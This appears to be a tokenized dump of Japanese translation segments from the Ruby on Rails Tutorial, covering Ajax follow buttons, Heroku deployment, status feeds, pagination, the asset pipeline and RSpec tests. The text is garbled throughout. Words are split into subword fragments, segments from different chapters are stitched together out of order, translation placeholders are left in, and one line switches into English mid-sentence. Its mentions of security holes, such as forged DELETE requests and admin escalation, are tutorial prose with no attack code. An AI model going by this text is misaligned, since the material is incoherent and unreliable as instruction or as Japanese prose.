▁ Create d ▁ http :// st or my - c lo u d - 5 88 1 . heroku app . com / ▁|
▁git @ heroku . com : st or my - c lo u d - 5 88 1 . heroku app . com
▁\ emph { A s y n ch r on o us ▁( 非 同 期 の ) ▁ JavaScript ▁A n d ▁ XML } の < n > それぞれの 頭 文字 を と っています 。 Ajax は し ば し ば ▁“ A J A X ” ▁ と 大文字 で 書かれ ます が 、\ href { http :// www . ad a p t ive path . com / id e as / ess a y s / ar ch ive s / 000 3 8 5 . ph p } { Ajax の 起 源 となる 記事 } では 一 貫 して ▁“ Ajax ” ▁ と な っています 。
▁Web フォーム に Ajax を 採 用 する のは 今 や 当 たり 前に なり つ つ あるので 、 Rails でも Ajax を簡単に 実装 できる ようになっています 。
▁Rails アプリケーションを 実際に Heroku に 展開 するには 、 まず Git を使用して Heroku に リポジトリ を プッシュ します 。
▁\ ko de { heroku } コマンド に 以下の 引数 を与える だけで 、 正しい アドレス で ブラウザ が 起動 します 。
▁ 残念ながら 、 Rails ▁4.0 では 技術 的な 理由 により 以下の エラー ページ が表示されます 。 Rails ▁4.0 の デフォルト ページ は Heroku では 表示 できません 。
▁ ER b によって 実際に 生成される HTML は それ ほど 重要 ではありません が 、 興 味 がある 方 のために 、 以下の 核 心 部分を お 見 せ します 。
▁ 以前の Rails では 完全な JavaScript コードを 挿 入 していました が 、 Rails ▁3 から は 、 この ように HTML プロ パ テ ィ を使用して 簡単に JavaScript を使用できます 。 これは 、\ href { http :// rails casts . com / e p is odes / 20 5 - un o b tr us ive - javascript }{\ emph { JavaScript を 前 面 に 出 す べ から ず } } という 哲 学 に従って います 。
▁ これはリスト \ ref { code : relationships _ controller _ spec _ ajax } で使用されていま した 。
▁ここでは \ ko de { x h r } メソッド ▁( “ X m l H tt p Request ” ▁ の 略 です ) ▁ を使用して Ajax リクエストを 発 行 しています 。 以前の 、\ ko de { get }、\ ko de { post }、\ ko de { patch }、\ ko de { delete } メソッド を使用した テスト と 比 べ て みてください 。
▁ それ から 、 Ajax リクエストを 受信 したときに \ ko de { create } アクション と \ ko de { destroy } アクション が 正常に 動作する ことを確認します
▁( Ajax を 多 用 する アプリケーションを 徹 底 的に テスト したい 方は 、\ href { http :// s e le n i um h q . org /}{ S e le n i um } と \ href { http :// w at ir . com /}{ W at ir } を参照 してみてください )。
▁ Relationship s コントローラ が Ajax リクエスト に応答する こと をテストする 。
▁( 実 を 言 う と 、 この \ href { http :// railstutorial . org } { Ruby ▁on ▁Rails チュートリアル Web サイト } も Heroku 上 に置かれ ています 。 本チュートリアル を オンライン で 読んで いる のであれば 、 ま さ に Heroku に ホ ス テ ィ ング された Web サイト を見 ている という ことになります )。
▁@ railstutorial j p ▁ で Ruby ▁on ▁Rails を 学習 中 !
▁ 後 は Rails を 実際に 勉 強 する だけです 。
▁ 一 緒 に 頑 張 り ましょう 。
▁ただし 、 どう い う わ け か この場合 \ ko de { x h r } メソッドを 結合 テスト で使用する ことができ ない ために 、 この コントローラ で のテスト を 行 な っています 。
▁\ ko de { x h r } は 先ほど 登 場 した ば か り ですが 、 本書 では ひ と まず コードの 文 脈 から 以下のコード の動作 を 推測 して い ただ く よう お 願 い します 。
▁\ ko de { x h r } が 取 る 引数 は 、 関連する HTTP メソッド を指す シンボル 、 アクション を指す シンボル 、 または コントローラ 自身 にある \ ko de { params } の内容 を表す ハッシュ のいずれか です 。
▁ これまで の例 と同様 、\ ko de { ex p e ct } を使用して ブロック 内の 操作 を まとめ 、 関連する カウント を 1 増 や したり 減 ら したり する テストを 行 な っています 。
▁この テストが 暗 に 示 している ように 、 実は この アプリケーション コードが Ajax リクエスト への 応答 に 使用する \ ko de { create } アクション と \ ko de { destroy } アクション は 、 通常の HTTP ▁\ text tt { POST } リクエスト と \ text tt { DELETE } リクエスト に応答する の に 使用される の と同じ ものです 。
▁ これはリスト \ ref { code : relationships _ controller _ ajax } で使用されていま した 。
▁ このコード では 、 リクエスト の 種類 に 応 じ た アクション を実行する ために \ ko de { respond _ to } を使用しています
▁( 注意 : ▁ここで 使用している \ ko de { respond _ to } は 、 RSpec の例 で 使用している \ ko de { respond _ to } とは 別 物 です )。
▁この 文法 は 少々 変 わ って いて 、 混 乱 を 招 く 可能性 がある ため 、 以下のコード の動作 を 理解 するようにしてください 。
▁上のコードでは 、 リクエスト の 種類 に応じて 、 続 く 行 の中から \ emph { 1 つ だけ } が 実行される ことに注意してください 。
▁ Ajax リクエストを 受信 した 場合は 、 Rails が自動的に アクション と同じ 名前 を持つ \ emph { JavaScript 組み込み Ruby } ▁(\ ko de { . js . erb }) ▁ ファイル ▁(\ ko de { create . js . erb } や \ ko de { destroy . js . erb } など ) ▁ を呼び出します 。
▁ ご 想 像 の とおり 、 これらの ファイル では JavaScript と 組み込み Ruby ▁( ER b ) ▁ を ミ ッ ク ス して 現在の ページ に対する アクション を実行する ことができます 。
▁ j Query ライブラリ には D O M 操作 用の 膨 大 な メソッドが 提供され ています が 、 ここで 使用する のは わずか 2 つ です 。
▁ 純 粋 な JavaScript と異なり 、 J S - ER b ファイル では 組み込み Ruby ▁( ER b ) ▁ を使用できます 。 \ ko de { create . js . erb } ファイル では 、 フォロー 用の フォーム を \ ko de { unfollow } パーシャル で 更新 し 、 フォロワー の カウント を更新する の に ER b を使用しています ▁( もちろん これは 、 フォロー に成功した場合 の動作 です )。
▁ このコード では \ ko de { es ca p e _ javascript } 関数 を使用し ていることに注目してください 。 この 関数 は 、 JavaScript ファイル 内に HTML を 挿 入 するときに 実行 結果を エスケープ する ▁( 画面 に 表示 しない ) ▁ ために 必要 です 。
▁ JavaScript 組み込み Ruby を使用して フォロー の リレーションシップ を作成する 。
▁これらの コード により 、 ユーザー プロファイル を表示し て 、 ページを 更新 せずに フォロー または フォロー解除 が できる ようになった はずです 。 テストスイート も パス するはずです 。
▁Rails で Ajax を使用する という テ ー マ は 奥 が 深 く 、 かつ 進 歩 が 早 い ので 、 本書 では ほ ん の 表 面 を な ぞ った に 過 ぎ ません 。 しかし 、 本書 の 他の 題 材 と同様 、 今後 より 高度な 資 料 に あ た る 際に 必要な 基 礎 となる はずです 。
▁この 機能を 実現 するには 、 Rails と Ruby の 高度な 機能 の 他 に 、 SQL プログラミング の 技術 も 必要 です 。
▁{0} 図 11 . 18 {/0} {1} ステータスフィード が表示され た Home ページのモックアップ 。 \ href { http :// railstutorial . org / images / figure s / page _ flow _ home _ page _ feed _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁self を省略した 結果を リスト \ ref { code : full _ feed _ spec s } に示します 。
▁ ステータスフィード の 最 終 テスト 。
▁上の メソッド を使用すれば 、\ ko de { user . followed _ users } にある 各 要素 の \ ko de { id } を 呼び出し 、 フォローしているユーザー の id の配列 を構成する ことができます 。
▁ここで 、 以下のコード を見てみましょう 。
▁ ここに 記述 されている のは ナ マ の SQL なので 、\ ko de { followed _ user _ id s } は エスケープ ではなく \ emph { 内 挿 ▁( in ter p ol at e ) ▁ } される ことに注意してください
▁WHERE ▁ follower _ id ▁= ▁: user _ id "
▁ Home ページ で 動作する ステータスフィード 。 \ href { http :// railstutorial . org / images / figure s / home _ page _ with _ feed _ bootstrap - full . png }{( 拡大 ) }
▁この サンプルアプリケーション には 、 Rails の 主要な 機能 ▁( モデル 、 ビュー 、 コントローラ 、 テンプレート 、 パーシャル 、 フィルタ 、 検証 、 コールバック 、\ ko de { has _ many } / \ ko de { belongs _ to } / \ ko de { has _ many ▁ through } 関連付け 、 セキュリティ 、 テスティング 、 展開 ) ▁ が 多 数 含まれています 。
▁\ href { http :// railstutorial . org / sc re en casts }{\ emph { Ruby ▁on ▁Rails チュートリアル } スクリーンキャスト } 。 本書 に合わせて 、 完 全 版 の スクリーンキャスト を 用 意 して あります 。
▁ スクリーンキャスト ▁( 英語 ) ▁ は ▁\ href { http :// railstutorial . org /}{ Ruby ▁on ▁Rails チュートリアル Web サイト } ( 英語 版 ) で 購 入 できます 。
▁Ruby と Rails の お勧め 書 籍 。 「\ href { http :// www . a mazon . com / g p / product / 14 30 2 23 6 3 4 }{\ emph { B e g in n ing ▁Ruby } } 」( P e ter ▁C oo per ▁ 著 ) 、 「\ href { http :// www . a mazon . com / g p / product / 19 3 3 9 88 6 5 7 }{\ emph { The ▁We ll - G r ound ed ▁Ruby ist } } 」( David ▁A . ▁B l ack 著 ) 、 「\ href { http :// www . a mazon . com / E lo que n t - Ruby - A d d is on - W es le y - Pro f ess ion al - S er ies / d p / 0 3 2 15 8 4 10 4 /}{ \ emph { E lo que n t ▁Ruby } } 」( R us s ▁ O l s en 著 ) 、 Ruby を さらに 深 く 学ぶ のであれば ▁ 「\ href { http :// www . a mazon . com / g p / product / 06 7 23 2 88 4 4 }{\ emph { The ▁Ruby ▁ W a y } } 」( H al ▁F ul to n 著 ) ▁ が お勧め です 。 Rails を さらに 深 く 学ぶ のであれば 、 「\ href { http :// www . a mazon . com / g p / product / 0 3 2 16 0 16 6 1 }{\ emph { The ▁Rails ▁3 ▁ W a y } } 」( O b i e ▁F er n and e z 著 ) と 「\ emph { Rails ▁3 ▁in ▁Action } ▁( 第 2 版 待 ち ) 」( Ryan ▁B ig g 、 Y e h u d a ▁ K at z 著 ) ▁ が お勧め です 。
▁\ href { http :// p e e p code . com /}{ P e e p Co de } と \ href { http :// code s ch o ol . com /}{ Co de ▁S ch o ol } 。 P e e p Co de の スクリーンキャスト と Co de ▁S ch o ol の イン タ ラ ク テ ィ ブ コース は 品 質 が 高 い ことで 知 られ ており 、 強 く お勧め いた します 。
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api . rubyonrails . org / v 4 . 2 . 0 / classes / ActiveRecord / Callbacks . html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を 読んで みてください 。
▁ 本チュートリアルで は 、「 start er ▁t i er 」 という サービス を使用する ことにします 。 これは 、 ( 執 筆 時点 では ) ▁1 日 の 最大 メール 数 が 4 00 通 まで という 制限 があります が 、 無料 で使用する ことができます 。
▁self を省略した 結果を リスト \ ref { code : generated _ user _ mailer _ preview s } に示します 。
▁self を省略した 結果を リスト \ ref { code : account _ activation _ preview } に示します 。
▁その ために 、 テキストエディタ で \ ko de { Gemfile } を 開 きます
▁リスト { p 0} の {2} Gemfile {/2} を 、 実際に 使用する 正 確 な バージョンの gem に置き換え た もの を リスト \ ref { code : gemfile _ sqlite _ version } に示します 。
▁ アプリケーションの { 0} Gemfile {/0} の内容 を リスト { p 1 } で 置き換え たら 、 { 0} bundle ▁install {/0} を実行して gem を インストール します
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api . rubyonrails . org / v 4 . 2 . 0 . b e t a 1 / classes / ActiveRecord / Callbacks . html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を 読んで みてください 。
▁{0} 図 3 .2{/0} ▁{1} \ href { http ://0.0.0.0:3000/ static _ pages / home }{/ static _ pages / home } にアクセス した 結果 {/1}
▁{0} 図 3 . 5 {/0} ▁{1} 作成した About ページ ▁(\ href { http ://0.0.0.0:3000/ static _ pages / about }{/ static _ pages / about }) {/1}
▁ これはリスト \ ref { code : title _ tests } で使用されていま した 。
▁ テスト の 結果を 図 \ ref { fig : home _ root _ route } に示します 。
▁( 実際 、\ ref { sec : demo _ users _ resource } や \ ref { sec : microposts _ resource } でも 説明したように 、\ ko de { rails ▁ generate } を実行すると ルーティング の \ ko de { routes . rb } ファイル も 自動的に 変更 される ので 、 これ も 元に戻 さ なく て は なり ません )。
▁ ステータスフィード で 要求 される 設計 は リスト \ ref { code : full _ feed _ test } のテスト で 明 確 になった ので ▁( この テストにパス すれば 良い ので ) 、 早 速 フィード の実装 に 着 手 してみましょう 。
▁{0}{1} 第 11 章 {/1}{/0} では ただ の プロ ト タイプ で した が ▁( 図 \ ref { fig : home _ with _ proto _ feed _ 3 r d _ edit ion }) 、 リスト \ ref { code : from _ users _ followed _ by _ f in al } の実装 によって 、 Home ページ で 完全な フィード が 表示 でき ている ことがわかります ▁( 図 \ ref { fig : home _ page _ with _ feed })。
▁それでは 、 コンソール で 文字列 について 調 べ てみましょう 。 今回は \ ko de { rails ▁console } の代わりに 、 短縮 版 の \ ko de { rails ▁c } で コンソール を 起動 します 。
▁たとえば 、 {0}{1} 図 1 . 5 {/1}{/0} を もう一度 見 てみると 、 コードを 8 0 文字 以下 に 抑 え るため の 小さな 縦 線 が 右 側 に 見え ます 。
▁ 本書 を ここ まで 進め てきた 今 であれば 、 上のコード の 意味 は ▁( たとえ 漠 然 と であっても ) ▁ 理解 できる はずです 。 \ ko de { StaticPages Controller } クラス は \ ko de { Application Controller } を継承し ており 、\ ko de { home } メソッド 、\ ko de { help } メソッド 、\ ko de { about } メソッドを 備 え ています 。
▁\ ko de { {1} リスト ▁3 . 6 {/1} } の {2} class {/2} という キーワード から 、 {2} static _ pages _ controller . rb {/2} は {2} StaticPages Controller {/2} という \ emph { クラス } を定義し ている ことがわかります 。
▁\ ref { sec : generated _ static _ pages } で 説明したように 、\ ko de { home } という アクション は \ ko de { home . html . erb } という ビュー に 関連付け られます 。 この ビュー は \ ko de { app / views / static _ pages } に あるので 、 ここに \ ko de { about . html . erb } という ファイルを 作 れば よ さ そう です 。
▁# ▁ トークン を作成する 。
▁\ ko de { private } キーワード 以降 で 定義された メソッドは すべて 隠 蔽 されます 。
▁ これはリスト \ ref { code : before _ create _ activation _ digest } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : account _ activation _ edit _ action } に示します 。
▁ これはリスト \ ref { code : add _ activation _ to _ users _ migration } で使用されていま した 。
▁ これはリスト \ ref { code : prev ent ing _ un activat ed _ login s } で使用されていま した 。
▁ else
▁( リスト \ ref { code : log _ in _ password _ reset s } と 図 \ ref { fig : forgot _ password _ link } 参 照 )
▁self を省略した 結果を リスト \ ref { code : password _ reset _ migration } に示します 。
▁self を省略した 結果を リスト \ ref { code : password _ reset _ form } に示します 。
▁ これはリスト \ ref { code : password _ reset s _ integration _ test } で使用されていま した 。
▁リスト \ ref { code : password _ reset s _ integration _ test } のコード を使用すると 、 テストコード は ▁\ passing ▁ になるはずです 。
▁ 一方 で 、 User モデル に対する 簡単な In ▁this ▁ case , ▁it ’ s ▁ e as y ▁to ▁ write ▁a ▁ sh or t ▁test ▁for ▁the ▁User ▁ model , ▁in ▁ w h i ch ▁we ▁use ▁\ ko de { following ?}
▁self を省略した 結果を リスト \ ref { code : relationships _ access _ control } に示します 。
▁self を省略した 結果を リスト \ ref { code : comment _ out _ failing _ tests } に示します 。
▁ユーザーの index ビュー 。
▁ユーザー インデックス 用の スタイル 。
▁ 複数の ユーザーが 表示 された ユーザー インデックス ページに するために は 、 ブラウザで サインアップ ページを 表示 して ユーザーを 手 作業 で 1 人 ず つ 追加 \ emph { する という 方法 もあります が } 、 せ っ か く なので Ruby と Rake を使用して ユーザーを 一 気 に 作成 しましょう 。
▁ユーザー インデックス の ページネーション 。
▁従って 、 1 ページ 目 は 1 から 30 のユーザー 、 2 ページ 目 は 3 1 から 6 0 のユーザー という 具 合 に データ が 取り 出 されます 。 ページ が \ ko de { nil } の場合 、 ▁\ ko de { paginate } は 単 に 最初の ページ を返します 。
▁ここで \ ko de { : page } パラメータ ー には \ ko de { params [: page ]} が 使用 されています が 、 これは \ ko de { will _ paginate } によって自動的に 生成されます 。
▁ユーザー インデックス への ページネーション 実装 は つ い に 完了 しました 。 でも 私 は 、 ここで ぜ ひ とも ある 1 つの 改良 を加え て み たい のです 。 実は Rails には コ ン パ ク ト な ビュー を作成する ための 素晴らしい ツール が い く つ もあります 。 この節 では それらの ツール を使用して インデックス ページの リファクタリング ▁( 動作 を 変え ずに コードを 整 理 すること ) ▁ を行う ことにします 。
▁ 完全に リファクタリング された ユーザー インデックス 。
▁ユーザー インデックス は と う と う 完了 しました 。 残 る は \ ko de { destroy } だけです 。 これ を実装する ことで 、 REST に 準 拠 した 正 統 な アプリケーション となります 。
▁最後に 、 開発 用 データベースに マイグレーション を行い 、 テスト 用 データベース を 準備 します 。
▁この リクエスト は 、 ユーザー 番号 17 番 を 管理者 に 変え てしまいます 。 ユーザーの この 行 為 は 、 少なくとも 重 大 な セキュリティ 違 反 となる 可能性があります し 、 実際には それ だけで は 済 ま ない でしょう 。
▁ まず 、 ユーザー インデックス ページの 各 ユーザーに 削除 用の リンク を追加し 、 続いて 管理 ユーザー への アクセス を 制限 します 。
▁ JavaScript を サポート しない ブラウザ を サポート する 必要がある 場合は 、 フォーム と \ text tt { POST } リクエスト を使用して \ text tt { DELETE } リクエストを 偽 造 することもできます 。 こ ち ら は JavaScript が なくても 動作します 。 詳 細 については RailsCast の 「\ href { http :// rails casts . com / e p is odes / 7 7 - destroy - with out - javascript } { JavaScript を使用し ない で 削除 する ( 英語 ) }」 を参照してください 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ 既に 、 管理者 のみ が ユーザーを削除 できるように 構成 済み です 。 削除リンク は 管理者 に しか 表示 されません 。
▁ 残 念 な ことに 、 実 はまだ 大きな セキュリティ ホ ー ル があります 。 ある程度 の 腕 前 を持つ 攻撃者 なら 、 コマンドライン で \ text tt { DELETE } リクエスト を直接 発行する という 方法で サイトの 全 ユーザーを削除 してしまう ことができる でしょう 。
▁ 本チュートリアル が 自分 に はまだ まだ 難 しい と 思 う 方 には 、\ href { http :// learn - rails . com /}{ \ emph { L e ar n ▁Ruby ▁on ▁Rails } } ▁( D an i e l ▁ K e h o e ) ▁ や \ href { http :// m b s y . co / 7 Z d c 7 } { O n e ▁Mon th ▁Rails } を 先に 学 んで お く と よいでしょう 。 どちら も まったく の 初心者 を 対象 と し ており 、\ emph { 本チュートリアル } よりも 敷居 が 低 く 設定 されています 。
▁もちろん 、 このような 重複 ▁( 2 回 以上 フォロー すること ) ▁ が 起 き ない よう 、 インターフェイス 側 の実装 でも 注意 を 払 います ( \ ref { sec : following })。 しかし 、 ユーザーが 何らかの 方法で ▁( たとえば \ text tt { c url } などの コマンドライン ツール を使用して ) ▁ Relationship の データを 操作 する ようなこと も 起 こ り 得 ます 。 そのような 場合 でも 、 一意 な インデックス を追加し ていれば 、 エラー を 発生 させ て 重複 を防ぐ ことができます 。
▁ following
▁ 開発 中に \ href { http :// en . w ikipedia . org / wiki / S N A F U } { 袋 小 路 } に 迷 い 込 んで し ま った 場合 でも 、 これらの 機能を 使 えば 元の 状態 を 復 元 できます 。
▁self を省略した 結果を リスト \ ref { code : install ing _ rails } に示します 。
▁\ ko de { Users } ではなく \ ko de { User } と した の はこの ためです 。
▁ 図 \ ref { fig : login _ page _ protected _ mockup _ bootstrap } のように 転 送 させる 仕組み を 実装 したい とき は 、 Users コントローラ の中で \ emph { before フィルター } を使います 。
▁ これはリスト \ ref { code : account _ activation _ and _ password _ reset s } で使用されていま した 。
▁リスト \ ref { code : test _ helper _ log _ in } のとき
▁ これはリスト \ ref { code : edit _ update _ redirect _ tests } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : correct _ user _ before _ filter } に示します 。
▁このコードは 、 値が \ ko de { nil } で なければ \ ko de { session [: return _ to ]} を 評価 し 、 nil であれば 与えられた デフォルトの URL を使用します
▁ 最初の 行 は 、 送信された メールアドレス を使用して 、 データベースから ユーザー を取り出し ています 。
▁ とは い う もの の 今 は 無 理 は 禁 物 です 。 この テストでは また いくつか 新しい アイディア を 投 入 する 必要 も あるので 、 テスト 作成 は \ ref { sec : layout _ link _ tests } に 回 す ことにします 。
▁self を省略した 結果を リスト \ ref { code : test _ helper _ sessions } に示します 。
▁self を省略した 結果を リスト \ ref { code : add _ remember _ digest _ to _ users _ generated } に示します 。
▁ これはリスト \ ref { code : remember _ test } で使用されていま した 。
▁ 何 でも よい
▁ メソッドを 組み込み クラス に追加 できる 柔 軟 性 の 高 さ の おかげで 、 純 粋 な Ruby を 極めて 自 然 に 拡 張 することができます ▁( もちろん 注意 して 使う 必要 は あります が )。
▁ cookies を 設定 後 、 移動 先 の ページ で 以下のような コード を使用して ユーザーを 取り出す ことができます 。
▁self を省略した 結果を リスト \ ref { code : log _ in _ with _ remember } に示します 。
▁self を省略した 結果を リスト \ ref { code : for get _ test } に示します 。
▁self を省略した 結果を リスト \ ref { code : user _ model _ for get } に示します 。
▁self を省略した 結果を リスト \ ref { code : branch _ raise } に示します 。
▁ これはリスト \ ref { code : persisten t _ sessions _ test } で使用されていま した 。
▁作成した コードをリスト \ ref { code : log _ out _ with _ test _ c lo s e _ browser } に示します
▁ これはリスト \ ref { code : test _ c lo s e _ browser } で使用されていま した 。
▁ No M e th o d Error : ▁ Y o u ▁ ha ve ▁a ▁nil ▁ object ▁ w h en ▁you ▁d id n ' t ▁ ex p e ct ▁it !
▁ Y o u ▁ m ig h t ▁ ha ve ▁ ex p e ct ed ▁ an ▁ instance ▁of ▁ Array .
▁ The ▁ error ▁ o c c ur re d ▁ w h il e ▁ eval u at ing ▁nil . empty ?
▁=> ▁[" User "]
▁\ ref { sec : login _ success } では 、 セッション を 操作 するために 必要な コードを いくつか 追加 し 、 ユーザー ログイン を 完成 させる 予定です 。
▁次に 、 ログイン に成功した場合 ▁(\ ref { sec : login _ success }) ▁ に 使用する 土 台 部分 を作成します 。 ここでは 、 ログイン が 送信 される たびに 、 パスワード と メールアドレス の 組み合わせ が 有効 かどうかを 判 定 します 。
▁ これはリスト \ ref { code : n e st ed _ hash es } で使用されていま した 。
▁次に 、 図 \ ref { fig : failed _ login _ flash _ 3 r d _ edit ion } と 図 \ ref { fig : flash _ persisten ce _ 3 r d _ edit ion } の 手順 を テストコード で 再 現 する必要があります 。
▁リスト { p 0} で {2} create {/2} アクション を 定義 できた ので 、\ ref { code : login _ form _ tag } で定義した ログインフォーム も 正常に 動作する ようになった はずです 。
▁作成した コードをリスト \ ref { code : test _ helper _ digest } に示します
▁リスト { p 0} の {2} digest {/2} メソッドが できた ので 、 有効な ユーザー を表す ユーザー フィクスチャ を作成 できるようになりました ▁( リスト \ ref { code : re al _ user _ fixture })。
▁リスト \ ref { code : a _ test _ for _ valid _ submission } のとき
▁作成した コードをリスト \ ref { code : login _ after _ signup _ test } に示します
▁ x ▁= ▁ x ▁+ ▁1
▁ x ▁+ = ▁1
▁$ ▁ rails ▁console
▁ >> ▁ x ▁= ▁1
▁=> ▁1
▁ >> ▁ x ▁+ = ▁1
▁=> ▁2
▁ >> ▁ x ▁* = ▁3
▁=> ▁ 6
▁=> ▁- 1
▁=> ▁nil
▁ x ▁= ▁ x ▁+ ▁1
▁ x ▁+ = ▁1
▁ >> ▁1. year . from _ now
▁ >> ▁10 . week s . ago
▁ >> ▁1. k il o by te
▁=> ▁10 2 4
▁ >> ▁5 . me g a by te s
▁=> ▁5 2 4 2 88 0
▁ 以後 この章 を 進め る に あ たり 、 有 用 な リソース である \ href { http :// ruby - doc . org / core - 2 . 0 /}{ Ruby ▁API } を参照 し ながら 学習 すること を ぜ ひ お勧め します 。 Ruby ▁API には 高 濃 縮 の 情報 が 詰 ま っています ▁( 少々 \ emph { 濃 厚 すぎる } とも 言 え ます )。 たとえば 、 Ruby の 文字列 の詳細 を 知りたい 場合は 、 Ruby ▁API エ ン ト リ の \ ko de { String } クラス を参照 すれば よい のです 。
▁\ ref { sec : comments _ for _ v ar io us _ reader s } でも 詳 しく 解 説 している とおり 、 Web 開発 は まったく の 初心者 が ち ょ っ と 頑 張 った だけで 簡単に 学 べ る ような もの ではありません 。
▁ サンプルアプリケーション で Bootstrap を使用する ための 変 換 作業 で 、 目 覚 ま しい 活 躍 を見 せ て 助 け て く れ た 読者 の \ href { https :// t w it ter . com / c ol m t u it e } { Co l m ▁ T u it e } に 感 謝 します 。
▁ 章 の 最後に 、 ユーザーを サイトに ログイン させる ための 重要な 一 歩 を 踏 み 出 します 。
▁(\ emph { 注 : } この時点で は わざわざ 見 に 行 く ほど の 仕 上 が り ではありません が )。
▁\ ko de { div } タグ の CSS クラス \ ko de { her o - un it } は 、 signup ボタン の \ ko de { b t n } クラス 、\ ko de { b t n - l ar g e } クラス 、\ ko de { b t n - primary } クラス と同様 、 Bootstrap において 特別な 意味 を 持 ち ます 。
▁ by ▁ Michael ▁Hartl
▁ 最 近 の Rails に追加 された 機能 の中で 最も 特 筆 すべき 機能 の ひとつ は 、 CSS 、 JavaScript 、 画像 などの 静 的 コンテンツ の 生 産 性 と 管理 を 大 幅 に 強 化 する 「 Asset ▁Pipeline 」 です 。
▁この節では 、 アセットパイプライン の 高度な 概 要 と 、 アセットパイプライン の一部 として デフォルトで 含 まれ ている 、\ emph { Sass } と呼ばれる 素晴らしい CSS 生成 ツール の 使い 方 について説明し ます 。
▁* ▁This ▁is ▁a ▁ ma n if e st ▁ file ▁that ' ll ▁ auto ma tic all y ▁ include ▁ all ▁the ▁ stylesheets
▁* ▁ available ▁in ▁this ▁ directory ▁and ▁ any ▁ sub - d ir e ct or ies .
▁* ▁ application - w id e ▁ style s ▁to ▁this ▁ file ▁and ▁the y ' ll ▁app e ar ▁ at ▁the ▁to p ▁of ▁the
▁* ▁ compile d ▁ file , ▁ b u t ▁it ' s ▁ g en er all y ▁be tt er ▁to ▁create ▁a ▁ new ▁ file ▁ per ▁ style
▁* ▁ scope .
▁これは 、 プ ログ ラ マ にとって は 便利な 方法 ですが 、 本番環境 にとって は 非 効率 です 。 それ という の も 、 最小化 されていない CSS や JavaScript ファイルを 多 数 インクルード すると 、 ページの 読み込み 時間 が 著 しく 遅 くなる からです ▁( 読み込み 時間 は 、 ユーザー 体 験 の 質 に 影 響 を与える 重要な 指 標 の 1 つ です )。
▁ 一方 、 Asset ▁Pipeline では 、 本番環境 に 最適化 するために 、 すべての スタイルシート を 1 つの CSS ファイル ▁(\ ko de { application . css }) ▁ に まとめ 、 すべての JavaScript ファイルを 1 つの J S ファイル ▁(\ ko de { javascripts . js }) ▁ に まとめ て く れ ます 。 さらに 、 それらの ファイル すべて に対して ▁(\ ko de { lib / assets } や \ ko de { vendor / assets } の ファイル も 含 め ) ▁ 不要な 空白 を 取り 除 く 処理 を行い 、 ファイル サイズ を \ emph { 最小化 } してくれます 。
▁これにより 、 Asset ▁Pipeline は 、 2 つの 異 な った 状 況 に対して それぞれ 最 高 の 環境 を 提 供 してくれます 。 つまり 、 プ ログ ラ マ ー に対して は 見 や す く 分割 された フォーマット の ファイルを 提供し 、 本番環境 に対して は 最適化 された 1 つの ファイルを 提 供 してくれます 。
▁ この章 の 終わり まで に 、 最後の リンクを 除 き 全 て 実装します 。
▁( {0}{1} 第 8 章 {/1}{/0} で 本 格 的に 実装します )。
▁ / signin
▁self を省略した 結果を リスト \ ref { code : comment _ out _ footer } に示します 。
▁ Contact ▁Ruby ▁on ▁Rails ▁Tutorial ▁ about ▁the ▁ sample ▁app ▁ at ▁the
▁今度は テストが 成功 する ことを確認 してください 。
▁つまり 、 以下のコード の場合 、
▁ 他の ページ について も同様に 変更 します 。
▁作成した コードをリスト \ ref { code : route _ tests } に示します
▁ 名前付きルート のテスト 。
▁ い つ も と同様に 、 今 度 のテスト は 赤 色 ▁( 失敗 ) ▁ になるはずです 。
▁ ルート ▁( root ) ▁ への ルーティング のための マッピング を追加する 。
▁ Capybara は \ emph { Web r at } の 後 続 プロジェクト であり 、 世界 \ href { http :// en . w ikipedia . org / wiki / Capybara } { 最大 の 齧 歯 類 } が 名前 の 由 来 です 。
▁" Help "
▁ 既に お 気 付き の 方 も いる と思います が 、 これまで 行 な っ てきた 、 レイアウト 上の リンク の ルーティング テストは 、 その リンク が 実際に 正しい ページ へのリンク になっている かどうかをチェックし て いません 。
▁self を省略した 結果を リスト \ ref { code : full _ title _ helper _ tests } に示します 。
▁(\ ko de { spec / helpers } ディレクトリ と \ ko de { application _ helper _ spec . rb } ファイルの 両方 を作成する 必要がある でしょう )。
▁ これはリスト \ ref { code : rspec _ u t il it ies _ s im p l ified } で使用されていま した 。
▁ テストスイート を実行して 、 新しい コード に 問題 がない ことを確認 してください 。
▁( この 演習 を 提 案 し 、 コードを 提 供 してくれ た \ href { http :// al ex cha f f e e . com /}{ A l ex ▁C ha f f e e } に 感 謝 します )。
▁\ ko de { full _ title } テスト ヘルパー を 単 純 に ▁\ ko de { include } で 置 換 する 。
▁この節では 、 RSpec の 最新の 機能を 使い 、 テストを より 簡潔 で 洗 練 された もの に します 。
▁ テスト の 改 善 方法 について 、 いくつかの 例 を見てみましょう 。
▁ まず 、 上の 3 つの 例 は いずれ も ルート への アクセス を 含 んで いる ことに 気 付き ます 。
▁\ ko de { before } ブロック を使用することで この 冗 長 箇所 を 除 く ことができます 。
▁上のコードでは 以下 を使用し ました 。
▁これにより 、 それぞれの 例 の 前に ルート パス への アクセス を実行します
▁(\ ko de { before } メソッドは 、 別 名 でも ある \ ko de { before (: each ) } で 呼 ぶ こともできます )。
▁ 冗 長 性 の 原 因 は 他にも あります 。
▁さらに 、 どちら の例 も \ ko de { page } 変数 を参照 しています 。
▁ 以下のように 、\ ko de { page } は テスト の \ emph { 主 題 ▁( subject ) ▁ } であることを RSpec に 伝 え る ことにより 、 冗 長 の 原 因 を 排 除 できます 。
▁次に 、 以下のように \ ko de { it } メソッドの 変 種 を使用する ことにより 、 コード と 記述 を 1 行 に 収 め ます 。
▁これらの 変更 を加え ること で Home ページの テストは より 簡潔 になります 。
▁上のコードは 以前 より 良 く なりました が 、 まだ タイトル の テストが 少し 長 す ぎ ます 。
▁\ ko de { full _ title } メソッド を持つ RSpec ユ ー テ ィ リ テ ィ ー 用 ファイル 。
▁\ ko de { spec / support } ディレクトリ は RSpec によって自動的に 読み込まれ るため 、 Home テストは 以下のように 書く ことができます 。
▁ Home ページ で 使用 した の と同じ 方法で 、 Help 、 About 、 Contact ページの テストを 単 純 化 することができます 。
